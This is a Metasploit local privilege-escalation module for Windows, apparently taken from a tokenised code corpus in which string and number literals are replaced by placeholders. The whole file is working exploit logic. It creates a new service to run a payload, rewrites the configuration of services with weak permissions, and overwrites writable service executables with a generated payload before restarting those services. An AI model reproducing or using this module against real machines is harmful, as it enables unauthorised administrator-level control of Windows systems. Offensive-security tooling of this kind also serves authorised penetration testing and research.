require <str> require <str> class Metasploit3 < Msf :: Exploit :: Local Rank = GreatRanking include Msf :: Post :: File include Msf :: Post :: Windows :: Services include Msf :: Post :: Windows :: Accounts include Msf :: Exploit :: EXE include Msf :: Exploit :: FileDropper ERROR = Msf :: Post :: Windows :: Error def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ ARCH_X86 , ARCH_X86_64 ] , <str> = > [ <str> ] , <str> = > [ <str> ] , <str> = > { <str> = > <str> , <str> = > <str> } , <str> = > [ [ <str> , { } ] , ] , <str> = > <int> , <str> = > <str> ) ) register_options ( [ OptBool . new ( <str> , [ false , <str> , false ] ) ] ) end def execute_payload_as_new_service ( path ) success = false print_status ( <str> ) service_name = Rex :: Text . rand_text_alpha ( ( rand ( <int> ) + <int> ) ) if service_create ( service_name , { <str> = > path , <str> = > <str> } ) == ERROR :: SUCCESS print_status ( <str> service_name <str> ) write_exe ( path , service_name ) if service_start ( service_name ) == ERROR :: SUCCESS print_good ( <str> ) success = true end service_delete ( service_name ) else print_status ( <str> ) success = false end return success end def weak_service_permissions ( service_name , service , path ) success = false vprint_status ( <str> service_name <str> ) if ( service_change_config ( service_name , { <str> = > path } ) == ERROR :: SUCCESS ) print_good ( <str> service_name <str> path <str> ) print_status ( <str> service_name <str> ) res = service_stop ( service_name ) if ( ( res == ERROR :: SUCCESS ) || ( res == ERROR :: SERVICE_NOT_ACTIVE ) ) write_exe ( path , service_name ) if service_restart ( service_name ) print_good ( <str> service_name <str> ) success = true else print_error ( <str> service_name <str> ) end end unless ( service_change_config ( service_name , { <str> = > service [ <str> ] } ) == ERROR :: SUCCESS ) print_error ( <str> service_name <str> service [ <str> ] <str> ) end end return success end def weak_file_permissions ( service_name , service , path , token ) success = false vprint_status ( <str> service_name <str> ) original_path = service [ <str> ] possible_path = expand_path ( original_path ) if ( possible_path [ <int> ] == <str> ) possible_path = possible_path . split ( <str> ) [ <int> ] else possible_path = possible_path . split ( <str> ) [ <int> ] end unless file? ( possible_path ) print_status ( <str> service_name <str> service [ <str> ] <str> ) end file_permissions = check_dir_perms ( possible_path , token ) if file_permissions && file_permissions . index ( <str> ) print_good ( <str> service_name <str> possible_path <str> ) begin status = service_status ( service_name ) no_access = false if status [ <str> ] == SERVICE_STOPPED stopped = true else res = service_stop ( service_name ) stopped = ( ( res == ERROR :: SUCCESS ) || ( res == ERROR :: SERVICE_NOT_ACTIVE ) ) end rescue RuntimeError = > e vprint_error ( <str> service_name <str> e <str> ) no_access = true end if stopped or no_access begin if move_file ( possible_path , possible_path + <str> ) write_exe ( possible_path , service_name ) print_status ( <str> service_name <str> possible_path <str> possible_path + <str> ) if service_restart ( service_name ) print_good ( <str> service_name <str> ) success = true else print_error ( <str> ) end end rescue Rex :: Post :: Meterpreter :: RequestError = > e vprint_error ( <str> service_name <str> e <str> ) end else vprint_error ( <str> service_name <str> ) end end return success end def write_exe ( path , service_name = nil ) vprint_status ( <str> service_name <str> path <str> ) exe = generate_payload_exe_service ( { <str> : service_name , <str> : get_payload_arch } ) write_file ( path , exe ) register_files_for_cleanup ( path ) end def get_payload_arch if payload . arch . include? ( ARCH_X86_64 ) return ARCH_X86_64 else return ARCH_X86 end end def exploit filename = Rex :: Text . rand_text_alpha ( ( rand ( <int> ) + <int> ) ) + <str> tempexe_name = Rex :: Text . rand_text_alpha ( ( rand ( <int> ) + <int> ) ) + <str> dir_env = get_envs ( <str> , <str> ) sysdir = dir_env [ <str> ] tmpdir = dir_env [ <str> ] tempexe = tmpdir + <str> + tempexe_name begin return if execute_payload_as_new_service ( tempexe ) rescue RuntimeError = > e vprint_status ( <str> e <str> ) end aggressive = datastore [ <str> ] print_status ( <str> ) token = get_imperstoken each_service do | serv | service_name = serv [ <str> ] service = service_info ( service_name ) begin return if weak_file_permissions ( service_name , service , tempexe , token ) and not aggressive return if weak_service_permissions ( service_name , service , tempexe ) and not aggressive rescue RuntimeError = > e vprint_status ( <str> serv [ <str> ] <str> e <str> ) end end end end 
